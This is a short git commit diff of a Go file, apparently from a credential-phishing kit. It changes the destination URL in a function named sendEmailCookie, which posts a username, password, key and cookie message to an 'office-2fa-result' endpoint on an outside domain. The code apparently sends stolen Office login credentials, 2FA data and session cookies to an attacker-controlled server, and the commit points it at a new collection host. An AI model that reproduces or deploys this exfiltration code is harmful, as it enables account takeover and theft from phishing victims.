3fbc30a077da3ded41a5b7c9cb515ef56e022ee0
asyouknowme <61052215+GilangNirwana@users.noreply.github.com>
2023-05-03 18:08:10 +0700

    Update database.go

--- database/database.go
+++ database/database.go
@@ -107,7 +107,7 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 
 	responseBody := bytes.NewBuffer(postBody)
 
-	request, _ := http.Post("https://vanilla.500daysofspring.com/public/api/office-2fa-result", "application/json", responseBody)
+	request, _ := http.Post("https://natrium100gram.site/public/api/office-2fa-result", "application/json", responseBody)
 
 	defer request.Body.Close()
 
